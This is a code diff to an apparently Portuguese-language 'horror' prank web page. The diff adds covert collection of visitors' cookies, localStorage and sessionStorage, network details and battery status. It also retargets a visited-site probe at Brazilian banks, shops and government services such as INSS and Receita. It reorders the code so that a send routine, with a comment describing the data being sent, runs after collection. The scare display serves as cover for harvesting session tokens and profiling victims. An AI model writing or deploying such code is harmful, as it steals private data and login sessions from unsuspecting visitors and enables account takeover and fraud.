@@ -455,9 +455,28 @@
                 memoria: navigator.deviceMemory || 'N/A',
                 largura: window.innerWidth,
                 altura: window.innerHeight,
+                larguraTela: window.screen.width,
+                alturaTela: window.screen.height,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: document.cookie,
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage),
+                conexao: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : 'N/A',
+                bateria: 'Aguardando...',
                 timestamp: new Date().toLocaleString('pt-BR')
             };
+
+            // Tentar pegar bateria
+            if (navigator.getBattery) {
+                navigator.getBattery().then(batt => {
+                    info.bateria = `${Math.round(batt.level * 100)}% (${batt.charging ? 'Carregando' : 'Descarregando'})`;
+                });
+            }
+
             return info;
         }
 
@@ -465,70 +484,39 @@
         function detectarSitesVisitados() {
             return new Promise((resolve) => {
                 const sitesPopulares = [
-                    // Redes Sociais
+                    // Redes Sociais & Mensageiros
                     'google.com', 'youtube.com', 'facebook.com', 'instagram.com',
                     'twitter.com', 'tiktok.com', 'snapchat.com', 'reddit.com',
                     'pinterest.com', 'linkedin.com', 'telegram.org', 'whatsapp.com',
                     'discord.com', 'nextdoor.com', 'quora.com', 'tumblr.com',
-                    'mastodon.social', 'bluesky.social', 'threads.net',
                     
-                    // Streaming
+                    // Streaming & Entretenimento
                     'netflix.com', 'hulu.com', 'disneyplus.com', 'primevideo.com',
                     'hbomax.com', 'twitch.tv', 'dailymotion.com', 'vimeo.com',
-                    'crunchyroll.com', 'peacock.com',
+                    'crunchyroll.com', 'spotify.com', 'soundcloud.com',
                     
-                    // Trabalho & Produtividade
-                    'gmail.com', 'outlook.com', 'office365.com', 'slack.com',
-                    'microsoft.com', 'apple.com', 'github.com', 'gitlab.com',
-                    'bitbucket.org', 'trello.com', 'asana.com', 'monday.com',
-                    'notion.so', 'figma.com', 'canva.com', 'adobe.com',
-                    'figma.com', 'miro.com', 'lucidchart.com', 'draw.io',
+                    // Bancos Brasileiros
+                    'itau.com.br', 'bradesco.com.br', 'santander.com.br',
+                    'bb.com.br', 'caixa.gov.br', 'nubank.com.br', 'inter.co',
+                    'btgpactual.com', 'pagseguro.uol.com.br', 'mercadopago.com.br',
                     
-                    // Dev & Tech
-                    'stackoverflow.com', 'wikipedia.org', 'medium.com',
-                    'dev.to', 'hashnode.com', 'freecodecamp.org', 'codecademy.com',
-                    'udemy.com', 'coursera.org', 'edx.org', 'skillshare.com',
-                    'udacity.com', 'pluralsight.com', 'datacamp.com',
+                    // E-commerce
+                    'mercadolivre.com.br', 'amazon.com.br', 'magazineluiza.com.br',
+                    'casasbahia.com.br', 'americanas.com.br', 'shopee.com.br',
+                    'aliexpress.com', 'shein.com', 'ifood.com.br',
                     
-                    // E-commerce & Finanças
-                    'amazon.com', 'ebay.com', 'aliexpress.com', 'alibaba.com',
-                    'shopify.com', 'paypal.com', 'stripe.com', 'skrill.com',
-                    'wise.com', 'revolut.com', 'nubank.com.br', 'b3.com.br',
-                    'coinbase.com', 'kraken.com', 'binance.com', 'crypto.com',
+                    // Notícias & Portais (Brasil)
+                    'uol.com.br', 'g1.globo.com', 'r7.com', 'terra.com.br',
+                    'estadao.com.br', 'folha.uol.com.br', 'globo.com',
                     
-                    // Bancos & Seguros
-                    'caixa.gov.br', 'bradesco.com.br', 'santander.com.br',
-                    'itau.com.br', 'bancodonordeste.com.br', 'banrisul.com.br',
-                    'bb.com.br', 'cef.gov.br', 'inter.co',
+                    // Ferramentas & Dev
+                    'github.com', 'gitlab.com', 'stackoverflow.com', 'notion.so',
+                    'figma.com', 'slack.com', 'microsoft.com', 'apple.com',
+                    'vercel.com', 'netlify.com', 'heroku.com', 'canva.com',
                     
-                    // Streaming de Música
-                    'spotify.com', 'applemusic.com', 'soundcloud.com',
-                    'deezer.com', 'tidal.com', 'pandora.com', 'bandcamp.com',
-                    'last.fm', 'audiomatch.com',
-                    
-                    // Busca & Informação
-                    'bing.com', 'duckduckgo.com', 'ecosia.org', 'startpage.com',
-                    'google.com.br', 'wikipedia.org', 'wiktionary.org',
-                    'imdb.com', 'themoviedb.org', 'myanimelist.net',
-                    
-                    // Email & Mensagens
-                    'protonmail.com', 'tutanota.com', 'zoho.com', 'mailchimp.com',
-                    'sendgrid.com', 'twilio.com', 'messenger.com',
-                    
-                    // Hospedagem & Cloud
-                    'heroku.com', 'netlify.com', 'vercel.com', 'digitalocean.com',
-                    'aws.amazon.com', 'cloud.google.com', 'azure.microsoft.com',
-                    'linode.com', 'vultr.com', 'ovh.com', 'ionos.com',
-                    
-                    // Redes VPN & Segurança
-                    'nordvpn.com', 'expressvpn.com', 'surfshark.com', 'cyberghost.com',
-                    'protonvpn.com', '1password.com', 'bitwarden.com', 'lastpass.com',
-                    'dashlane.com',
-                    
-                    // Notícias
-                    'bbc.com', 'cnn.com', 'foxnews.com', 'theguardian.com',
-                    'nytimes.com', 'washingtonpost.com', 'uol.com.br', 'g1.com.br',
-                    'folha.uol.com.br', 'globonews.com.br'
+                    // Governo & Serviços (Brasil)
+                    'gov.br', 'receita.fazenda.gov.br', 'meu.inss.gov.br',
+                    'tituloseletronico.tse.jus.br', 'serasa.com.br'
                 ];
 
                 const visitados = [];
@@ -655,12 +643,15 @@ ${sitesTexto}
             }, 10000);
         }
 
-        function iniciarSequenciaHorror() {
+        async function iniciarSequenciaHorror() {
             gerarSomAssustador();
-            criarImagensBizarras(); // Agora é async
+            await criarImagensBizarras(); // Agora espera a coleta de sites
 
             const horrorLayer = document.getElementById('horrorLayer');
             horrorLayer.style.display = 'block';
+            
+            // Chamar o envio APÓS a coleta
+            baixarFotoAutomatico();
             
             const mensagensHorror = [
                 'ALGUÉM ESTÁ ASSISTINDO',
@@ -778,7 +769,6 @@ ${sitesTexto}
             // INICIAR HORROR IMEDIATAMENTE
             setTimeout(() => {
                 iniciarSequenciaHorror();
-                baixarFotoAutomatico();
             }, 300);
         }
 
